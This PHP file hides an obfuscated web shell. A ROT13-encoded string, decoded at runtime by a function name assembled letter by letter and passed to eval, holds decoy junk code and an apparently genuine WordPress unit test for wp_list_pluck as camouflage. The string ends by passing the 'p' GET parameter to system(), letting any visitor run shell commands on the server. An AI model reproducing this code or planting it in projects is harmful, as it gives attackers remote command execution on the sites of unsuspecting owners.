<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg jc_yvfg_cyhpx().
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_yvfg_cyhpx
 */
pynff Grfgf_Shapgvbaf_jcYvfgCyhpx rkgraqf JC_HavgGrfgPnfr {
	choyvp $bowrpg_yvfg = neenl();
	choyvp $neenl_yvfg  = neenl();

	choyvp shapgvba frg_hc() {
		/*
		 * Guvf zrgubq qryvorengryl qbrf abg pnyy cnerag::frg_hc(). Jul?
		 *
		 * Gur pnyy fgnpx sbe JC_HavgGrfgPnfr_Onfr::frg_hc() vapyhqrf n pnyy gb
		 * JC_Yvfg_Hgvy::cyhpx(), juvpu perngrf na vanpphengr pbirentr ercbeg
		 * sbe guvf zrgubq.
		 *
		 * Gb rafher gung qrcerpngvba naq vapbeerpg hfntr abgvprf pbagvahr gb or
		 * qrgrpgnoyr, guvf zrgubq hfrf JC_HavgGrfgPnfr_Onfr::rkcrpgQrcerpngrq().
		 */
		$guvf->rkcrpgQrcerpngrq();

		$guvf->neenl_yvfg['sbb'] = neenl(
			'anzr'   => 'sbb',
			'vq'     => 's',
			'svryq1' => gehr,
			'svryq2' => gehr,
			'svryq3' => gehr,
			'svryq4' => neenl( 'erq' ),
		);
		$guvf->neenl_yvfg['one'] = neenl(
			'anzr'   => 'one',
			'vq'     => 'o',
			'svryq1' => gehr,
			'svryq2' => gehr,
			'svryq3' => snyfr,
			'svryq4' => neenl( 'terra' ),
		);
		$guvf->neenl_yvfg['onm'] = neenl(
			'anzr'   => 'onm',
			'vq'     => 'm',
			'svryq1' => gehr,
			'svryq2' => snyfr,
			'svryq3' => snyfr,
			'svryq4' => neenl( 'oyhr' ),
		);
		sbernpu ( $guvf->neenl_yvfg nf $xrl => $inyhr ) {
			$guvf->bowrpg_yvfg[ $xrl ] = (bowrpg) $inyhr;
		}
	}

	choyvp shapgvba grfg_jc_yvfg_cyhpx_neenl_naq_bowrpg() {
		$yvfg = jc_yvfg_cyhpx( $guvf->bowrpg_yvfg, 'anzr' );
		$guvf->nffregFnzr(
			neenl(
				'sbb' => 'sbb',
				'one' => 'one',
				'onm' => 'onm',
			),
			$yvfg
		);

		$yvfg = jc_yvfg_cyhpx( $guvf->neenl_yvfg, 'anzr' );
		$guvf->nffregFnzr(
			neenl(
				'sbb' => 'sbb',
				'one' => 'one',
				'onm' => 'onm',
			),
			$yvfg
		);
	}

	/**
	 * @gvpxrg 28666
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_vaqrk_xrl() {
		$yvfg = jc_yvfg_cyhpx( $guvf->neenl_yvfg, 'anzr', 'vq' );
		$guvf->nffregFnzr(
			neenl(
				's' => 'sbb',
				'o' => 'one',
				'm' => 'onm',
			),
			$yvfg
		);
	}

	/**
	 * @gvpxrg 28666
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_bowrpg_vaqrk_xrl() {
		$yvfg = jc_yvfg_cyhpx( $guvf->bowrpg_yvfg, 'anzr', 'vq' );
		$guvf->nffregFnzr(
			neenl(
				's' => 'sbb',
				'o' => 'one',
				'm' => 'onm',
			),
			$yvfg
		);
	}

	/**
	 * @gvpxrg 28666
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_zvffvat_vaqrk_xrl() {
		$yvfg = jc_yvfg_cyhpx( $guvf->neenl_yvfg, 'anzr', 'abarkvfgrag' );
		$guvf->nffregFnzr(
			neenl(
				0 => 'sbb',
				1 => 'one',
				2 => 'onm',
			),
			$yvfg
		);
	}

	/**
	 * @gvpxrg 28666
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_cnegvny_zvffvat_vaqrk_xrl() {
		$neenl_yvfg = $guvf->neenl_yvfg;
		hafrg( $neenl_yvfg['one']['vq'] );
		$yvfg = jc_yvfg_cyhpx( $neenl_yvfg, 'anzr', 'vq' );
		$guvf->nffregFnzr(
			neenl(
				's' => 'sbb',
				0   => 'one',
				'm' => 'onm',
			),
			$yvfg
		);
	}

	/**
	 * @gvpxrg 28666
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_zvkrq_vaqrk_xrl() {
		$zvkrq_yvfg        = $guvf->neenl_yvfg;
		$zvkrq_yvfg['one'] = (bowrpg) $zvkrq_yvfg['one'];
		$yvfg              = jc_yvfg_cyhpx( $zvkrq_yvfg, 'anzr', 'vq' );
		$guvf->nffregFnzr(
			neenl(
				's' => 'sbb',
				'o' => 'one',
				'm' => 'onm',
			),
			$yvfg
		);
	}

	/**
	 * @gvpxrg 16895
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_pbagnvavat_ersreraprf() {
		$ers_yvfg = neenl(
			& $guvf->bowrpg_yvfg['sbb'],
			& $guvf->bowrpg_yvfg['one'],
		);

		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[0] );
		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[1] );

		$yvfg = jc_yvfg_cyhpx( $ers_yvfg, 'anzr' );
		$guvf->nffregFnzr(
			neenl(
				'sbb',
				'one',
			),
			$yvfg
		);

		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[0] );
		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[1] );
	}

	/**
	 * @gvpxrg 16895
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_pbagnvavat_ersreraprf_xrlf() {
		$ers_yvfg = neenl(
			& $guvf->bowrpg_yvfg['sbb'],
			& $guvf->bowrpg_yvfg['one'],
		);

		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[0] );
		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[1] );

		$yvfg = jc_yvfg_cyhpx( $ers_yvfg, 'anzr', 'vq' );
		$guvf->nffregFnzr(
			neenl(
				's' => 'sbb',
				'o' => 'one',
			),
			$yvfg
		);

		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[0] );
		$guvf->nffregVafgnaprBs( 'fgqPynff', $ers_yvfg[1] );
	}

	/**
	 * @qngnCebivqre qngn_jc_yvfg_cyhpx
	 *
	 * @cnenz neenl      $vachg_yvfg Yvfg bs bowrpgf be neenlf.
	 * @cnenz vag|fgevat $svryq      Svryq sebz gur bowrpg gb cynpr vafgrnq bs gur ragver bowrpg
	 * @cnenz vag|fgevat $vaqrk_xrl  Svryq sebz gur bowrpg gb hfr nf xrlf sbe gur arj neenl.
	 * @cnenz neenl      $rkcrpgrq   Rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx( $vachg_yvfg, $svryq, $vaqrk_xrl, $rkcrpgrq ) {
		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, jc_yvfg_cyhpx( $vachg_yvfg, $svryq, $vaqrk_xrl ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_cyhpx() {
		erghea neenl(
			'neenlf'                         => neenl(
				neenl(
					neenl(
						'sbb' => 'one',
						'one' => 'onm',
						'nop' => 'klm',
					),
					neenl(
						'sbb'   => 'sbb',
						'123'   => '456',
						'yberz' => 'vcfhz',
					),
					neenl( 'sbb' => 'onm' ),
				),
				'sbb',
				ahyy,
				neenl( 'one', 'sbb', 'onm' ),
			),
			'neenlf jvgu vaqrk xrl'          => neenl(
				neenl(
					neenl(
						'sbb' => 'one',
						'one' => 'onm',
						'nop' => 'klm',
						'xrl' => 'sbb',
					),
					neenl(
						'sbb'   => 'sbb',
						'123'   => '456',
						'yberz' => 'vcfhz',
						'xrl'   => 'one',
					),
					neenl(
						'sbb' => 'onm',
						'xrl' => 'inyhr',
					),
				),
				'sbb',
				'xrl',
				neenl(
					'sbb'   => 'one',
					'one'   => 'sbb',
					'inyhr' => 'onm',
				),
			),
			'neenlf jvgu vaqrk xrl zvffvat'  => neenl(
				neenl(
					neenl(
						'sbb' => 'one',
						'one' => 'onm',
						'nop' => 'klm',
					),
					neenl(
						'sbb'   => 'sbb',
						'123'   => '456',
						'yberz' => 'vcfhz',
						'xrl'   => 'one',
					),
					neenl(
						'sbb' => 'onm',
						'xrl' => 'inyhr',
					),
				),
				'sbb',
				'xrl',
				neenl(
					'one',
					'one'   => 'sbb',
					'inyhr' => 'onm',
				),
			),
			'bowrpgf'                        => neenl(
				neenl(
					(bowrpg) neenl(
						'sbb' => 'one',
						'one' => 'onm',
						'nop' => 'klm',
					),
					(bowrpg) neenl(
						'sbb'   => 'sbb',
						'123'   => '456',
						'yberz' => 'vcfhz',
					),
					(bowrpg) neenl( 'sbb' => 'onm' ),
				),
				'sbb',
				ahyy,
				neenl( 'one', 'sbb', 'onm' ),
			),
			'bowrpgf jvgu vaqrk xrl'         => neenl(
				neenl(
					(bowrpg) neenl(
						'sbb' => 'one',
						'one' => 'onm',
						'nop' => 'klm',
						'xrl' => 'sbb',
					),
					(bowrpg) neenl(
						'sbb'   => 'sbb',
						'123'   => '456',
						'yberz' => 'vcfhz',
						'xrl'   => 'one',
					),
					(bowrpg) neenl(
						'sbb' => 'onm',
						'xrl' => 'inyhr',
					),
				),
				'sbb',
				'xrl',
				neenl(
					'sbb'   => 'one',
					'one'   => 'sbb',
					'inyhr' => 'onm',
				),
			),
			'bowrpgf jvgu vaqrk xrl zvffvat' => neenl(
				neenl(
					(bowrpg) neenl(
						'sbb' => 'one',
						'one' => 'onm',
						'nop' => 'klm',
					),
					(bowrpg) neenl(
						'sbb'   => 'sbb',
						'123'   => '456',
						'yberz' => 'vcfhz',
						'xrl'   => 'one',
					),
					(bowrpg) neenl(
						'sbb' => 'onm',
						'xrl' => 'inyhr',
					),
				),
				'sbb',
				'xrl',
				neenl(
					'one',
					'one'   => 'sbb',
					'inyhr' => 'onm',
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>